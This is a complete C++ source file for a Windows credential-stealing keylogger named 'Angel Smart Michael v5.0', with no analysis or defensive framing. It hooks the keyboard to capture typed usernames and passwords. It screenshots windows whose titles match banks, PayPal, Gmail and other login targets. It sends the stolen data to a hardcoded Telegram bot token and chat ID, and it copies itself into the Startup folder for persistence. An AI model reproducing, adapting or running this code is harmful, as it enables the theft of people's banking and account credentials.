#define WIN32_LEAN_AND_MEAN
#define STRICT

#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <commctrl.h>
#include <shellapi.h>
#include <mutex>
#include <thread>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winhttp.lib")

using namespace Gdiplus;

// Config
const wchar_t* TELEGRAM_BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* TELEGRAM_CHAT_ID = L"7845441585";
const wchar_t* MUTEX_NAME = L"AngelSmartMichael_v5.0_Singleton";

// Global state
std::mutex g_mutex;
std::wstring g_username, g_password;
HWND g_targetWindow = NULL;
bool g_running = true;
ULONG_PTR g_gdiplusToken;
HHOOK g_hKeyboardHook = NULL;
std::wstring g_currentField;

// Forward declarations
bool SendTelegram(const std::wstring& message);
bool TakeSmartScreenshot();
bool UploadToTelegram(const std::wstring& filepath);
void HeartbeatThread();
void LoginDetectorThread();
std::wstring GetActiveWindowTitle();
bool IsLoginPage(const std::wstring& title);
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
void InstallPersistence();

// Low-level keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        wchar_t ch[2] = { 0 };
        
        if (pKb->vkCode == VK_TAB) {
            if (!g_currentField.empty()) {
                if (g_username.empty()) g_username = g_currentField;
                else g_password = g_currentField;
                g_currentField.clear();
            }
            return 1; // Block real TAB
        }
        
        if (pKb->vkCode == VK_RETURN || pKb->vkCode == VK_ESCAPE) {
            if (!g_username.empty() && !g_password.empty()) {
                std::wstring creds = L"👼 CREDENTIALS CAPTURED:\n";
                creds += L"User: " + g_username + L"\n";
                creds += L"Pass: " + g_password + L"\n";
                SendTelegram(creds);
                g_username.clear();
                g_password.clear();
            }
        }
        
        // Capture typing
        if (pKb->vkCode >= 0x30 && pKb->vkCode <= 0x5A) { // Letters, numbers
            BYTE keyState[256] = { 0 };
            WORD wChar = 0;
            
            if (GetKeyboardState(keyState)) {
                if (ToUnicode(pKb->vkCode, pKb->scanCode, keyState, ch, 2, 0) > 0) {
                    g_currentField += ch[0];
                }
            }
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// Get active window title
std::wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"";
    
    wchar_t title[256];
    GetWindowTextW(hwnd, title, 256);
    return std::wstring(title);
}

// Smart screenshot
bool TakeSmartScreenshot() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return false;
    
    std::wstring title = GetActiveWindowTitle();
    if (!IsLoginPage(title)) return false;
    
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    RECT rcClient;
    GetClientRect(hwnd, &rcClient);
    
    int width = rcClient.right - rcClient.left;
    int height = rcClient.bottom - rcClient.top;
    
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hbmScreen);
    
    PrintWindow(hwnd, hdcMem, 0);
    
    // GDI+ save as JPEG
    Bitmap bmp(hbmScreen, NULL);
    CLSID jpegClsid;
    GetEncoderClsid(L"image/jpeg", &jpegClsid);
    
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    wcscat_s(tempPath, MAX_PATH, L"angel_screenshot.jpg");
    
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 90;
    encoderParams.Parameter[0].Value = &quality;
    
    Status status = bmp.Save(tempPath, &jpegClsid, &encoderParams);
    
    // Cleanup
    DeleteObject(hbmScreen);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    
    if (status == Ok) {
        return UploadToTelegram(tempPath);
    }
    return false;
}

// Login page detection
bool IsLoginPage(const std::wstring& title) {
    if (title.empty()) return false;
    
    std::wstring lowerTitle = title;
    std::transform(lowerTitle.begin(), lowerTitle.end(), lowerTitle.begin(), ::towlower);
    
    std::vector<std::wstring> targets = {
        L"gmail", L"facebook", L"instagram", L"outlook", L"office", L"live",
        L"login", L"signin", L"sign in", L"account", L"auth", L"password",
        L"bank", L"paypal", L"amazon", L"netflix", L"twitter", L"x.com",
        L"chase", L"wellsfargo", L"bankofamerica", L"citi", L"microsoft"
    };
    
    for (const auto& target : targets) {
        if (lowerTitle.find(target) != std::wstring::npos) {
            return true;
        }
    }
    return false;
}

// Telegram API
bool SendTelegram(const std::wstring& message) {
    HINTERNET hSession = WinHttpOpen(L"Angel/5.0", 
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org",
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    std::wstring apiPath = L"/bot";
    apiPath += TELEGRAM_BOT_TOKEN;
    apiPath += L"/sendMessage?chat_id=";
    apiPath += TELEGRAM_CHAT_ID;
    apiPath += L"&text=";
    
    // URL encode the message (simplified)
    std::wstring encodedMsg;
    for (wchar_t c : message) {
        if (c == L' ') encodedMsg += L"%20";
        else if (c == L'\n') encodedMsg += L"%0A";
        else encodedMsg += c;
    }
    apiPath += encodedMsg;
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", apiPath.c_str(),
                                           NULL, WINHTTP_NO_REFERER,
                                           WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    BOOL bResults = WinHttpSendRequest(hRequest,
                                      WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                      WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    
    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return bResults != FALSE;
}

bool UploadToTelegram(const std::wstring& filepath) {
    std::wstring msg = L"📸 Screenshot captured: ";
    msg += filepath;
    return SendTelegram(msg);
}

// Persistence
void InstallPersistence() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    
    wchar_t startupPath[MAX_PATH];
    GetEnvironmentVariableW(L"APPDATA", startupPath, MAX_PATH);
    wcscat_s(startupPath, MAX_PATH, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ANGELS.exe");
    
    CopyFileW(path, startupPath, FALSE);
}

// Threads
void HeartbeatThread() {
    while (g_running) {
        std::this_thread::sleep_for(std::chrono::minutes(30));
        SendTelegram(L"👼 Angel Smart Michael v5.0 - ACTIVE");
    }
}

void LoginDetectorThread() {
    while (g_running) {
        TakeSmartScreenshot();
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
}

// GDI+ Helpers
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (!pImageCodecInfo) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}

// Entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Single instance
    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Install persistence
    InstallPersistence();
    
    // Install keyboard hook
    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, 
                                       GetModuleHandle(NULL), 0);
    
    // Start threads
    std::thread heartbeat(HeartbeatThread);
    std::thread detector(LoginDetectorThread);
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    g_running = false;
    heartbeat.join();
    detector.join();
    
    if (g_hKeyboardHook) {
        UnhookWindowsHookEx(g_hKeyboardHook);
    }
    
    GdiplusShutdown(g_gdiplusToken);
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    
    return 0;
}
